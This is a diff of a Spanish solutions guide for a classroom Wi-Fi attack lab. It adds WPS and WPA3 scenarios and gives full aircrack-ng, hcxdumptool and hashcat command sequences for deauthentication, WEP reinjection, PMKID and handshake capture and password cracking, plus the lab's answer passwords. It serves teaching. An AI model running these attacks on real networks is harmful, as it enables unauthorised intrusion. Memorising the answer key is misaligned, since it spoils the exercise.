@@ -349,20 +349,20 @@ del Código Penal).</p>
 </blockquote>
 <hr>
 <h2 id="0-puesta-en-marcha">0. Puesta en marcha</h2>
-<pre class="hljs"><code><div>sudo ./despliegue.sh
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> ./despliegue.sh
 </div></code></pre>
 <p>El script instala lo que falte (<code>hostapd</code>, <code>hcxtools</code>, <code>pocl-opencl-icd</code>,
-<code>ocl-icd-libopencl1</code>), levanta los 6 escenarios y, al terminar, imprime el
+<code>ocl-icd-libopencl1</code>), levanta los 10 escenarios y, al terminar, imprime el
 <strong>SSID, canal y BSSID real</strong> de cada uno (las claves no se muestran). Los BSSID
 cambian en cada despliegue. Las interfaces de trabajo del alumno son
 <strong><code>wlan0</code> … <code>wlan6</code></strong>.</p>
 <p>Para desmontarlo todo: <code>sudo ./limpia.sh</code>.</p>
 <h3 id="poner-una-interfaz-en-modo-monitor">Poner una interfaz en modo monitor</h3>
-<pre class="hljs"><code><div>sudo airmon-ng start wlan0 &lt;canal&gt;   <span class="hljs-comment"># crea wlan0mon</span>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> airmon-ng start wlan0 &lt;canal&gt;   <span class="hljs-comment"># crea wlan0mon</span>
 <span class="hljs-comment"># o, a mano:</span>
-sudo ip link <span class="hljs-built_in">set</span> wlan0 down
-sudo iw dev wlan0 <span class="hljs-built_in">set</span> <span class="hljs-built_in">type</span> monitor
-sudo ip link <span class="hljs-built_in">set</span> wlan0 up
+<span class="hljs-built_in">sudo</span> ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> wlan0 down
+<span class="hljs-built_in">sudo</span> iw dev wlan0 <span class="hljs-built_in">set</span> <span class="hljs-built_in">type</span> monitor
+<span class="hljs-built_in">sudo</span> ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> wlan0 up
 </div></code></pre>
 <p><strong>No uses <code>airmon-ng check kill</code>.</strong> El script ya excluye las radios virtuales
 de NetworkManager, así que no hay nada que matar. Además, <code>ip netns exec</code> no
@@ -372,10 +372,10 @@ los escenarios se quedarían sin tráfico (hay que volver a desplegar).
 aviso y se puede ignorar.</p>
 <h3 id="localizar-objetivos-y-fijar-canal">Localizar objetivos y fijar canal</h3>
 <pre class="hljs"><code><div><span class="hljs-comment"># Barrido general: anota BSSID y canal (CH)</span>
-sudo airodump-ng wlan0
+<span class="hljs-built_in">sudo</span> airodump-ng wlan0
 
 <span class="hljs-comment"># Fijar la interfaz al canal del objetivo (ej. canal 11)</span>
-sudo iw dev wlan0 <span class="hljs-built_in">set</span> channel 11
+<span class="hljs-built_in">sudo</span> iw dev wlan0 <span class="hljs-built_in">set</span> channel 11
 </div></code></pre>
 <hr>
 <h2 id="soluciones">Soluciones</h2>
@@ -430,21 +430,54 @@ sudo iw dev wlan0 <span class="hljs-built_in">set</span> channel 11
 <td>3</td>
 <td>WPA2-EAP</td>
 <td>Análisis pasivo de EAP-PEAP</td>
-<td>Identidad <code>student_user@domain.lab</code> · tipo EAP 25 (PEAP) · cert. <code>radius.domain.lab</code></td>
+<td>Identidad <code>alumno@iesvjp.es</code> · tipo EAP 25 (PEAP) · cert. <code>radius.domain.lab</code></td>
+</tr>
+<tr>
+<td><code>he_wps</code></td>
+<td>7</td>
+<td>WPA2-PSK + WPS</td>
+<td>Fuerza bruta online del PIN WPS</td>
+<td>PIN y clave <strong>aleatorios en cada despliegue</strong> (ver sección 7)</td>
+</tr>
+<tr>
+<td><code>he_wpa3_tm</code></td>
+<td>2</td>
+<td>WPA2/WPA3 mixto</td>
+<td>Atacar la parte WPA2 de una red en transición</td>
+<td><code>princess</code> (por la vía WPA2)</td>
+</tr>
+<tr>
+<td><code>he_wpa3</code></td>
+<td>5</td>
+<td>WPA3-SAE puro</td>
+<td>Diccionario <strong>online</strong> contra SAE</td>
+<td><code>iloveyou</code> (solo online)</td>
+</tr>
+<tr>
+<td><code>he_wpa3_dg</code></td>
+<td>10</td>
+<td>WPA3-SAE puro</td>
+<td>Downgrade a WPA2 con AP gemelo (Dragonblood)</td>
+<td><code>babygirl</code> (por el M2 robado)</td>
 </tr>
 </tbody>
 </table>
-<p>Las tres claves WPA2 están en <code>rockyou.txt</code>. El password interno del cliente
-Enterprise (<code>EnterprisePass2026</code>) <strong>no</strong> es un objetivo de la práctica: el
-alumno solo debe identificar la identidad en claro y el método EAP.</p>
+<p>Las claves de los tres escenarios WPA3 (<code>princess</code>, <code>iloveyou</code>, <code>babygirl</code>)
+están en <code>rockyou.txt</code>, a propósito: la lección de WPA3 es que sin una clave
+débil estos ataques no llegan a ninguna parte. SAE <strong>no admite</strong> la PMK en hex
+(<code>sae_password</code> necesita la passphrase en claro), así que aquí no hay anti-cheat
+por diseño del protocolo: las claves están en <code>despliegue.sh</code>.</p>
+<p>Las tres claves WPA2 de <code>he_wpa2</code>, <code>he_pmkid</code> y <code>he_pmkid_nc</code> y la contraseña
+del usuario Enterprise (<code>computer</code>) están en <code>rockyou.txt</code>. La clave de
+<code>he_wps</code> <strong>no</strong> está en ningún diccionario, a propósito.</p>
 <hr>
 <h2 id="1-he-open-red-abierta-trafico-en-claro">1. <code>he_open</code> — Red abierta (tráfico en claro)</h2>
 <p>Un cliente envía un POST de login en bucle. El objetivo es demostrar que en una
 red sin cifrado las credenciales viajan legibles.</p>
-<pre class="hljs"><code><div>sudo iw dev wlan0 <span class="hljs-built_in">set</span> channel 1
-sudo airodump-ng -c 1 --bssid &lt;BSSID_OPEN&gt; -w cap_open wlan0
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> iw dev wlan0 <span class="hljs-built_in">set</span> channel 1
+<span class="hljs-built_in">sudo</span> airodump-ng -c 1 --bssid &lt;BSSID_OPEN&gt; -w cap_open wlan0
 <span class="hljs-comment"># En otra terminal, filtrar el POST en la captura:</span>
-tshark -r cap_open-01.cap -Y <span class="hljs-string">'http.request.method == "POST"'</span> -T fields -e http.file_data
+tshark -r cap_open-01.cap -Y <span class="hljs-string">&#x27;http.request.method == &quot;POST&quot;&#x27;</span> -T fields -e http.file_data
 </div></code></pre>
 <p><strong>Resultado esperado:</strong> <code>user=admin&amp;pass=SecretPass2026</code>.</p>
 <p><strong>Aprendizaje:</strong> cualquiera en la misma red abierta ve las credenciales.</p>
@@ -467,18 +500,18 @@ negociada por Diffie-Hellman sin necesidad de contraseña.</li>
 <h2 id="2-he-wep-wep-ivs-reinyeccion-arp">2. <code>he_wep</code> — WEP (IVs + reinyección ARP)</h2>
 <p>Dos clientes generan ARP broadcast en bucle, ideal para la reinyección. Basta
 una sola interfaz en monitor para capturar e inyectar.</p>
-<pre class="hljs"><code><div><span class="hljs-comment"># Monitor en el canal 9 (sin 'check kill')</span>
-sudo airmon-ng start wlan0 9
+<pre class="hljs"><code><div><span class="hljs-comment"># Monitor en el canal 9 (sin &#x27;check kill&#x27;)</span>
+<span class="hljs-built_in">sudo</span> airmon-ng start wlan0 9
 
 BSSID=&lt;BSSID_WEP&gt;
 
 <span class="hljs-comment"># 1. Capturar IVs (terminal 1, dejar corriendo)</span>
-sudo airodump-ng -c 9 --bssid <span class="hljs-variable">$BSSID</span> -w cap_wep wlan0mon
+<span class="hljs-built_in">sudo</span> airodump-ng -c 9 --bssid <span class="hljs-variable">$BSSID</span> -w cap_wep wlan0mon
 <span class="hljs-comment">#    Anotar la MAC de un cliente de la lista STATION (p. ej. 02:00:00:00:13:00)</span>
 CLIENT=&lt;MAC_CLIENTE&gt;
 
 <span class="hljs-comment"># 2. Reinyección ARP suplantando al cliente (terminal 2)</span>
-sudo aireplay-ng -3 -b <span class="hljs-variable">$BSSID</span> -h <span class="hljs-variable">$CLIENT</span> wlan0mon
+<span class="hljs-built_in">sudo</span> aireplay-ng -3 -b <span class="hljs-variable">$BSSID</span> -h <span class="hljs-variable">$CLIENT</span> wlan0mon
 <span class="hljs-comment">#    Si se reinicia, reutilizar el ARP ya capturado:</span>
 <span class="hljs-comment">#    sudo aireplay-ng -3 -b $BSSID -h $CLIENT -r replay_arp-*.cap wlan0mon</span>
 
@@ -568,7 +601,7 @@ de la <em>Association Response</em>, hostapd no da por asociada la estación y d
 los ARP inyectados (aireplay muestra <code>got a deauth/disassoc packet</code>).</p>
 <p>Síntoma típico: aireplay envía miles de paquetes, pero <code>#Data</code> en airodump
 apenas sube (2-3/s). Comprobación desde el host:</p>
-<pre class="hljs"><code><div>sudo ip netns <span class="hljs-built_in">exec</span> ns_ap_wep iw dev wlan_ap_wep station dump | grep Station
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> ip netns <span class="hljs-built_in">exec</span> ns_ap_wep iw dev wlan_ap_wep station dump | grep Station
 <span class="hljs-comment"># Solo aparecen los dos clientes reales, no la MAC de wlan0mon</span>
 </div></code></pre>
 <p>Suplantando a un cliente ya asociado, el AP acepta los ARP y los retransmite
@@ -582,24 +615,24 @@ distintas. Se ignora; lo que importa es que <code>#Data</code> suba.</p>
 <p>Si <code>-3</code> no llega a capturar ningún ARP, se obtiene el keystream de cualquier
 paquete de datos y se forja un ARP:</p>
 <pre class="hljs"><code><div><span class="hljs-comment"># Keystream: fragmentación (si falla, chopchop con -4 -&gt; replay_dec-*.xor)</span>
-sudo aireplay-ng -5 -b <span class="hljs-variable">$BSSID</span> -h <span class="hljs-variable">$CLIENT</span> wlan0mon          <span class="hljs-comment"># -&gt; fragment-*.xor</span>
+<span class="hljs-built_in">sudo</span> aireplay-ng -5 -b <span class="hljs-variable">$BSSID</span> -h <span class="hljs-variable">$CLIENT</span> wlan0mon          <span class="hljs-comment"># -&gt; fragment-*.xor</span>
 
 packetforge-ng -0 -a <span class="hljs-variable">$BSSID</span> -h <span class="hljs-variable">$CLIENT</span> -k 255.255.255.255 -l 255.255.255.255 \
                -y fragment-*.xor -w arp_forjado.cap
 
-sudo aireplay-ng -2 -r arp_forjado.cap wlan0mon              <span class="hljs-comment"># responder "y"</span>
+<span class="hljs-built_in">sudo</span> aireplay-ng -2 -r arp_forjado.cap wlan0mon              <span class="hljs-comment"># responder &quot;y&quot;</span>
 </div></code></pre>
 <hr>
 <h2 id="3-he-wpa2-handshake-4-way-crackeo-offline">3. <code>he_wpa2</code> — Handshake 4-way + crackeo offline</h2>
 <p>Hay dos clientes asociados.</p>
 <h3 id="a-capturar-el-handshake">a) Capturar el handshake</h3>
-<pre class="hljs"><code><div>sudo iw dev wlan0 <span class="hljs-built_in">set</span> channel 6
-sudo airodump-ng -c 6 --bssid &lt;BSSID_WPA2&gt; -w cap_wpa2 wlan0
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> iw dev wlan0 <span class="hljs-built_in">set</span> channel 6
+<span class="hljs-built_in">sudo</span> airodump-ng -c 6 --bssid &lt;BSSID_WPA2&gt; -w cap_wpa2 wlan0
 </div></code></pre>
 <h3 id="b-forzar-reconexion-con-un-deauth-desde-otra-terminal">b) Forzar reconexión con un deauth (desde otra terminal)</h3>
-<pre class="hljs"><code><div>sudo iw dev wlan1 <span class="hljs-built_in">set</span> <span class="hljs-built_in">type</span> monitor &amp;&amp; sudo ip link <span class="hljs-built_in">set</span> wlan1 up
-sudo iw dev wlan1 <span class="hljs-built_in">set</span> channel 6
-sudo aireplay-ng -0 3 -a &lt;BSSID_WPA2&gt; wlan1
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> iw dev wlan1 <span class="hljs-built_in">set</span> <span class="hljs-built_in">type</span> monitor &amp;&amp; <span class="hljs-built_in">sudo</span> ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> wlan1 up
+<span class="hljs-built_in">sudo</span> iw dev wlan1 <span class="hljs-built_in">set</span> channel 6
+<span class="hljs-built_in">sudo</span> aireplay-ng -0 3 -a &lt;BSSID_WPA2&gt; wlan1
 </div></code></pre>
 <p>Cuando airodump muestre <code>WPA handshake: &lt;BSSID&gt;</code> arriba a la derecha, ya lo tienes.</p>
 <h3 id="c-crackear">c) Crackear</h3>
@@ -616,7 +649,7 @@ hashcat -m 22000 hash_wpa2.22000 /usr/share/wordlists/rockyou.txt
 ella se deriva la <strong>PMK</strong>, y en cada conexión se deriva de la PMK una clave
 temporal, la <strong>PTK</strong>:</p>
 <pre class="hljs"><code><div>PMK = PBKDF2-HMAC-SHA1(passphrase, SSID, 4096 iteraciones, 256 bits)
-PTK = PRF-512(PMK, &quot;Pairwise key expansion&quot;,
+PTK = PRF-512(PMK, "Pairwise key expansion",
               min(MAC_AP,MAC_STA) ‖ max(MAC_AP,MAC_STA) ‖
               min(ANonce,SNonce)  ‖ max(ANonce,SNonce))
 KCK = primeros 128 bits de la PTK      (clave para el MIC)
@@ -684,14 +717,14 @@ vías</strong>: capturar el PMKID (campo del M1) o el handshake 4-way tras un de
 captura PMKID y handshakes a la vez.</p>
 <h3 id="a-capturar-con-hcxdumptool-canal-11-solo-este-ap">a) Capturar con hcxdumptool (canal 11, solo este AP)</h3>
 <pre class="hljs"><code><div><span class="hljs-comment"># Localizar el objetivo</span>
-sudo airodump-ng wlan0mon --band g       <span class="hljs-comment"># he_pmkid: CH 11, con una estación</span>
+<span class="hljs-built_in">sudo</span> airodump-ng wlan0mon --band g       <span class="hljs-comment"># he_pmkid: CH 11, con una estación</span>
 BSSID=&lt;BSSID_PMKID&gt;
 
 <span class="hljs-comment"># Filtro BPF para no atacar los otros escenarios</span>
-sudo hcxdumptool --bpfc=<span class="hljs-string">"wlan addr3 <span class="hljs-variable">$BSSID</span>"</span> &gt; pmkid.bpf
+<span class="hljs-built_in">sudo</span> hcxdumptool --bpfc=<span class="hljs-string">&quot;wlan addr3 <span class="hljs-variable">$BSSID</span>&quot;</span> &gt; pmkid.bpf
 
 <span class="hljs-comment"># Interfaz limpia: hcxdumptool la pone en monitor él solo</span>
-sudo hcxdumptool -i wlan1 -c 11a --bpf=pmkid.bpf -w pmkid_cli.pcapng --rds=1
+<span class="hljs-built_in">sudo</span> hcxdumptool -i wlan1 -c 11a --bpf=pmkid.bpf -w pmkid_cli.pcapng --rds=1
 </div></code></pre>
 <p><code>pmkid.bpf</code> no forma parte del lab: lo genera <code>--bpfc</code> en la primera
 línea. Es el filtro compilado a bytecode BPF, en el mismo formato que
@@ -722,8 +755,8 @@ dejarlo corriendo: mientras está activo sigue desconectando al cliente.</p>
 <span class="hljs-comment"># Quedarse solo con he_pmkid (por si se ha colado otra red)</span>
 hcxhashtool -i pmkid_cli.22000 --essid=he_pmkid -o solo_pmkid.22000
 
-grep -c <span class="hljs-string">'^WPA\*01'</span> solo_pmkid.22000   <span class="hljs-comment"># PMKID</span>
-grep -c <span class="hljs-string">'^WPA\*02'</span> solo_pmkid.22000   <span class="hljs-comment"># handshake (M1+M2)</span>
+grep -c <span class="hljs-string">&#x27;^WPA\*01&#x27;</span> solo_pmkid.22000   <span class="hljs-comment"># PMKID</span>
+grep -c <span class="hljs-string">&#x27;^WPA\*02&#x27;</span> solo_pmkid.22000   <span class="hljs-comment"># handshake (M1+M2)</span>
 </div></code></pre>
 <p>En el resumen de hcxpcapngtool:</p>
 <ul>
@@ -762,19 +795,19 @@ reasociación: el AP responde con un M1 que (en este lab, con el hostapd
 parcheado) lleva el <strong>PMKID</strong>, y acto seguido se completa el <strong>handshake
 4-way</strong>. airodump-ng guarda ambos en el mismo <code>.cap</code>.</p>
 <pre class="hljs"><code><div><span class="hljs-comment"># Monitor y localización</span>
-sudo airmon-ng start wlan0               <span class="hljs-comment"># -&gt; wlan0mon</span>
-sudo airodump-ng wlan0mon --band g       <span class="hljs-comment"># he_pmkid: CH 11, con una estación</span>
+<span class="hljs-built_in">sudo</span> airmon-ng start wlan0               <span class="hljs-comment"># -&gt; wlan0mon</span>
+<span class="hljs-built_in">sudo</span> airodump-ng wlan0mon --band g       <span class="hljs-comment"># he_pmkid: CH 11, con una estación</span>
 
 <span class="hljs-comment"># Capturar fijando canal y BSSID (anota la MAC del cliente en STATION)</span>
 BSSID=&lt;BSSID_PMKID&gt;
-sudo airodump-ng -c 11 --bssid <span class="hljs-variable">$BSSID</span> -w cap_pmkid wlan0mon
+<span class="hljs-built_in">sudo</span> airodump-ng -c 11 --bssid <span class="hljs-variable">$BSSID</span> -w cap_pmkid wlan0mon
 </div></code></pre>
 <p>airodump-ng captura de forma <strong>pasiva</strong>. Si el cliente ya estaba asociado
 antes de empezar, puede que no se vea aún ni el handshake ni el PMKID: hay que
 provocar una reconexión.</p>
 <pre class="hljs"><code><div><span class="hljs-comment"># Desde otra terminal: deauth dirigido al cliente (-c) o a todos</span>
 CLIENT=&lt;MAC_CLIENTE&gt;
-sudo aireplay-ng -0 3 -a <span class="hljs-variable">$BSSID</span> -c <span class="hljs-variable">$CLIENT</span> wlan0mon
+<span class="hljs-built_in">sudo</span> aireplay-ng -0 3 -a <span class="hljs-variable">$BSSID</span> -c <span class="hljs-variable">$CLIENT</span> wlan0mon
 </div></code></pre>
 <p>Al reconectarse el cliente, airodump-ng muestra arriba a la derecha
 <code>WPA handshake: &lt;BSSID&gt;</code>; las versiones recientes también anuncian el PMKID
@@ -800,7 +833,7 @@ y la caché de PMK (802.11i/r, OKC). Si el cliente vuelve a un AP que ya
 conoce su PMK, ambos la identifican por el PMKID y se ahorran repetir la
 autenticación completa. El AP lo incluye en el campo <em>Key Data</em> (RSN IE) del
 <strong>M1</strong>:</p>
-<pre class="hljs"><code><div>PMKID = HMAC-SHA1-128(PMK, &quot;PMK Name&quot; ‖ MAC_AP ‖ MAC_STA)
+<pre class="hljs"><code><div>PMKID = HMAC-SHA1-128(PMK, "PMK Name" ‖ MAC_AP ‖ MAC_STA)
 </div></code></pre>
 </li>
 <li>
@@ -845,18 +878,18 @@ basta con provocar uno mismo la asociación para que el AP emita ese M1.</p>
 <code>hcxpcapngtool</code> extrae el PMKID (línea <code>WPA*01</code>) y <code>hashcat -m 22000</code> lo
 crackea.</p>
 <pre class="hljs"><code><div><span class="hljs-comment"># Localizar el objetivo</span>
-sudo airmon-ng start wlan0
-sudo airodump-ng wlan0mon --band g       <span class="hljs-comment"># he_pmkid_nc: CH 4, sin estaciones</span>
+<span class="hljs-built_in">sudo</span> airmon-ng start wlan0
+<span class="hljs-built_in">sudo</span> airodump-ng wlan0mon --band g       <span class="hljs-comment"># he_pmkid_nc: CH 4, sin estaciones</span>
 BSSID=&lt;BSSID_PMKID_NC&gt;
 </div></code></pre>
 <h3 id="metodo-a-hcxdumptool-ataque-clientless-real">Método A: hcxdumptool (ataque <em>clientless</em> &quot;real&quot;)</h3>
 <p>hcxdumptool se hace pasar por un cliente con una MAC inventada, se autentica y
 se asocia con el AP, y guarda el M1 que este le envía.</p>
 <pre class="hljs"><code><div><span class="hljs-comment"># Interfaz limpia: hcxdumptool la pone en monitor él solo</span>
-sudo hcxdumptool -i wlan1 -c 4a -w pmkid_nc.pcapng --rds=1
+<span class="hljs-built_in">sudo</span> hcxdumptool -i wlan1 -c 4a -w pmkid_nc.pcapng --rds=1
 <span class="hljs-comment">#   -c 4a es imprescindible: por defecto solo salta por los canales 1, 6 y 11</span>
-<span class="hljs-comment">#   (la "a" indica la banda de 2,4 GHz). Sintaxis de la 6.3 y posteriores.</span>
-<span class="hljs-comment">#   Esperar a que la fila de he_pmkid_nc muestre "+" en la columna P y pulsar Ctrl+C.</span>
+<span class="hljs-comment">#   (la &quot;a&quot; indica la banda de 2,4 GHz). Sintaxis de la 6.3 y posteriores.</span>
+<span class="hljs-comment">#   Esperar a que la fila de he_pmkid_nc muestre &quot;+&quot; en la columna P y pulsar Ctrl+C.</span>
 
 hcxpcapngtool -o pmkid_nc.22000 pmkid_nc.pcapng   <span class="hljs-comment"># debe escribir una línea WPA*01</span>
 hashcat -m 22000 pmkid_nc.22000 /usr/share/wordlists/rockyou.txt
@@ -869,28 +902,28 @@ se completa (ver más abajo: hostapd sin recompilar). Si <code>1</code> tiene <c
 no, el AP envía el M1 sin PMKID.</p>
 <p><strong>Requiere el hostapd recompilado con el parche del ACK.</strong> Si
 <code>/usr/local/sbin/hostapd-pmkid</code> es anterior a ese parche:</p>
-<pre class="hljs"><code><div>sudo ./limpia.sh
-sudo ./compila_hostapd_pmkid.sh --force    <span class="hljs-comment"># deben salir DOS "[OK] Parche aplicado"</span>
-sudo ./despliegue.sh
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> ./limpia.sh
+<span class="hljs-built_in">sudo</span> ./compila_hostapd_pmkid.sh --force    <span class="hljs-comment"># deben salir DOS &quot;[OK] Parche aplicado&quot;</span>
+<span class="hljs-built_in">sudo</span> ./despliegue.sh
 </div></code></pre>
 <h3 id="metodo-b-wpa-supplicant-con-una-contrasena-falsa">Método B: <code>wpa_supplicant</code> con una contraseña falsa</h3>
 <p>El atacante se asocia como un cliente normal, con una contraseña cualquiera.
 El AP envía el M1 con el PMKID <strong>antes</strong> de comprobar nada. No necesita el
 hostapd recompilado con el parche del ACK.</p>
 <pre class="hljs"><code><div><span class="hljs-comment"># wlan1 en modo managed (si hcxdumptool la dejó en monitor)</span>
-sudo ip link <span class="hljs-built_in">set</span> wlan1 down; sudo iw dev wlan1 <span class="hljs-built_in">set</span> <span class="hljs-built_in">type</span> managed; sudo ip link <span class="hljs-built_in">set</span> wlan1 up
+<span class="hljs-built_in">sudo</span> ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> wlan1 down; <span class="hljs-built_in">sudo</span> iw dev wlan1 <span class="hljs-built_in">set</span> <span class="hljs-built_in">type</span> managed; <span class="hljs-built_in">sudo</span> ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> wlan1 up
 
 <span class="hljs-comment"># Terminal 1: capturar en el canal 4</span>
-sudo airodump-ng -c 4 --bssid <span class="hljs-variable">$BSSID</span> -w pmkid_nc wlan0mon
+<span class="hljs-built_in">sudo</span> airodump-ng -c 4 --bssid <span class="hljs-variable">$BSSID</span> -w pmkid_nc wlan0mon
 
 <span class="hljs-comment"># Terminal 2: asociarse con una contraseña falsa</span>
 wpa_passphrase he_pmkid_nc contrasenafalsa &gt; falso.conf
-sudo wpa_supplicant -D nl80211 -i wlan1 -c falso.conf
+<span class="hljs-built_in">sudo</span> wpa_supplicant -D nl80211 -i wlan1 -c falso.conf
 <span class="hljs-comment">#   ~10 s: saldrán errores de 4-way handshake (clave incorrecta). Ctrl+C</span>
 
 <span class="hljs-comment"># Extraer SOLO el PMKID y crackear</span>
 hcxpcapngtool -o todo.22000 pmkid_nc-01.cap
-grep <span class="hljs-string">'WPA\*01'</span> todo.22000 &gt; pmkid_nc.22000
+grep <span class="hljs-string">&#x27;WPA\*01&#x27;</span> todo.22000 &gt; pmkid_nc.22000
 hashcat -m 22000 pmkid_nc.22000 /usr/share/wordlists/rockyou.txt
 </div></code></pre>
 <p>El <code>grep</code> es necesario: la captura también contiene el M2 que ha enviado
@@ -899,8 +932,9 @@ hashcat -m 22000 pmkid_nc.22000 /usr/share/wordlists/rockyou.txt
 <p><strong>Resultado esperado (ambos métodos):</strong> <code>football</code>.</p>
 <h3 id="por-que-hubo-que-recompilar-hostapd-para-el-metodo-a">Por qué hubo que recompilar hostapd para el método A</h3>
 <p><code>compila_hostapd_pmkid.sh</code> aplica <strong>dos</strong> parches a hostapd 2.10. Los dos
-afectan solo al binario <code>hostapd-pmkid</code> (escenarios <code>he_pmkid</code> y
-<code>he_pmkid_nc</code>); el resto de escenarios usa el hostapd del sistema.</p>
+afectan solo al binario <code>hostapd-pmkid</code> (escenarios <code>he_pmkid</code>, <code>he_pmkid_nc</code>
+y, por el parche 2, también <code>he_wps</code>); el resto de escenarios usa el hostapd
+del sistema.</p>
 <ol>
 <li><strong>PMKID en el M1 con WPA-PSK</strong> (<code>src/ap/wpa_auth.c</code>). El hostapd de serie
 solo incluye el PMKID en el M1 con 802.1X, SAE u OWE. Sin este parche no
@@ -918,8 +952,8 @@ asociación por fallida y <strong>nunca envía el M1</strong>.</li>
 <p>Síntoma sin el parche 2: la captura de hcxdumptool solo tiene un beacon y una
 <em>probe response</em>, y hcxpcapngtool avisa de que faltan tramas de autenticación y
 asociación (<code>no hashes written</code>). Para comprobarlo en directo:</p>
-<pre class="hljs"><code><div>sudo iw dev wlan0mon <span class="hljs-built_in">set</span> channel 4
-sudo tcpdump -i wlan0mon -e -n <span class="hljs-string">"wlan addr3 <span class="hljs-variable">$BSSID</span> and not subtype beacon"</span>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> iw dev wlan0mon <span class="hljs-built_in">set</span> channel 4
+<span class="hljs-built_in">sudo</span> tcpdump -i wlan0mon -e -n <span class="hljs-string">&quot;wlan addr3 <span class="hljs-variable">$BSSID</span> and not subtype beacon&quot;</span>
 <span class="hljs-comment"># Se ve Authentication/Association, pero ninguna trama EAPOL del AP</span>
 </div></code></pre>
 <p>El parche 2 solo cambia qué hace hostapd cuando <strong>falta</strong> el ACK. Los
@@ -928,7 +962,8 @@ siguen funcionando igual. El único efecto secundario es que cada intento de
 hcxdumptool deja una estación &quot;fantasma&quot; hasta que caduca por inactividad
 (unos 5 minutos).</p>
 <p>Es la misma limitación que impide el fake auth (<code>aireplay-ng -1</code>) en el
-escenario WEP.</p>
+escenario WEP, y la que obliga a usar este binario en <code>he_wps</code> (Reaver y
+Bully también se asocian desde modo monitor).</p>
 <p><strong>Comparación (respuesta a la pregunta de la guía del alumno):</strong></p>
 <table>
 <thead>
@@ -1015,8 +1050,8 @@ debilidad que se comenta en el fundamento técnico.</li>
 <p>Al desplegar debe salir
 <code>[✓] Cliente he_enterprise autenticado (PEAP/MSCHAPv2)</code>.</p>
 <h3 id="a-capturar">a) Capturar</h3>
-<pre class="hljs"><code><div>sudo airmon-ng start wlan0 3
-sudo airodump-ng -c 3 --bssid &lt;BSSID_ENT&gt; -w cap_ent wlan0mon
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> airmon-ng start wlan0 3
+<span class="hljs-built_in">sudo</span> airodump-ng -c 3 --bssid &lt;BSSID_ENT&gt; -w cap_ent wlan0mon
 <span class="hljs-comment"># Esperar ~1 min (al menos una reasociación) y Ctrl+C</span>
 </div></code></pre>
 <h3 id="b-identidad-y-metodo-eap">b) Identidad y método EAP</h3>
@@ -1040,7 +1075,7 @@ sudo airodump-ng -c 3 --bssid &lt;BSSID_ENT&gt; -w cap_ent wlan0mon
 <tr>
 <td>2 (Response)</td>
 <td>1</td>
-<td>El cliente responde con <code>student_user@domain.lab</code> <strong>en claro</strong></td>
+<td>El cliente responde con <code>alumno@iesvjp.es</code> <strong>en claro</strong></td>
 </tr>
 <tr>
 <td>1 (Request)</td>
@@ -1061,29 +1096,29 @@ sudo airodump-ng -c 3 --bssid &lt;BSSID_ENT&gt; -w cap_ent wlan0mon
 </table>
 <h3 id="c-certificado-del-servidor">c) Certificado del servidor</h3>
 <p>Con TLS 1.2, el certificado del servidor viaja en claro dentro de PEAP:</p>
-<pre class="hljs"><code><div>tshark -r cap_ent-01.cap -Y <span class="hljs-string">"tls.handshake.type == 11"</span> -V | grep -i <span class="hljs-string">"id-at-commonName"</span>
+<pre class="hljs"><code><div>tshark -r cap_ent-01.cap -Y <span class="hljs-string">&quot;tls.handshake.type == 11&quot;</span> -V | grep -i <span class="hljs-string">&quot;id-at-commonName&quot;</span>
 </div></code></pre>
 <p>Debe aparecer <code>radius.domain.lab</code>. Es lo que debería comprobar el cliente, y
 lo que imitaría un AP falso. Si la línea no sale, la sesión ha usado TLS 1.3,
 que cifra el certificado. No afecta al resultado de la práctica.</p>
-<p><strong>Resultado esperado:</strong> identidad <code>student_user@domain.lab</code> (viaja en claro en
+<p><strong>Resultado esperado:</strong> identidad <code>alumno@iesvjp.es</code> (viaja en claro en
 la fase externa), tipo EAP 25 = PEAP y certificado <code>CN=radius.domain.lab</code>
 autofirmado.</p>
 <p><strong>Si no aparece ningún paquete EAP:</strong> la captura empezó después de una
 reasociación y se cortó antes de la siguiente. Hay que esperar más. También
 puede que el cliente no se haya autenticado al desplegar. Para comprobarlo:</p>
-<pre class="hljs"><code><div>sudo ip netns <span class="hljs-built_in">exec</span> ns_cli_ent wpa_cli -p /var/run/wpa_supplicant_ent -i wlan_cli_ent status | grep -E <span class="hljs-string">"wpa_state|EAP"</span>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> ip netns <span class="hljs-built_in">exec</span> ns_cli_ent wpa_cli -p /var/run/wpa_supplicant_ent -i wlan_cli_ent status | grep -E <span class="hljs-string">&quot;wpa_state|EAP&quot;</span>
 <span class="hljs-comment"># wpa_state=COMPLETED  /  EAP state=SUCCESS  /  selectedMethod=25 (EAP-PEAP)</span>
 </div></code></pre>
 <h3 id="d-metodo-1-suite-aircrack-ng-y-por-que-no-crackea-enterprise">d) Método 1 — suite aircrack-ng (y por qué <strong>no</strong> crackea Enterprise)</h3>
 <p>Es un ejercicio de contraste, no un ataque que funcione. El alumno comprueba
 de primera mano que la vía habitual contra WPA2-PSK aquí no sirve.</p>
 <pre class="hljs"><code><div><span class="hljs-comment"># Capturar el handshake igual que en he_wpa2</span>
-sudo airmon-ng start wlan0 3
-sudo airodump-ng -c 3 --bssid &lt;BSSID_ENT&gt; -w cap_ent wlan0mon
+<span class="hljs-built_in">sudo</span> airmon-ng start wlan0 3
+<span class="hljs-built_in">sudo</span> airodump-ng -c 3 --bssid &lt;BSSID_ENT&gt; -w cap_ent wlan0mon
 
 <span class="hljs-comment"># Forzar una reautenticación (opcional: el cliente ya reasocia cada 30 s)</span>
-sudo aireplay-ng -0 3 -a &lt;BSSID_ENT&gt; -c &lt;MAC_CLIENTE&gt; wlan0mon
+<span class="hljs-built_in">sudo</span> aireplay-ng -0 3 -a &lt;BSSID_ENT&gt; -c &lt;MAC_CLIENTE&gt; wlan0mon
 
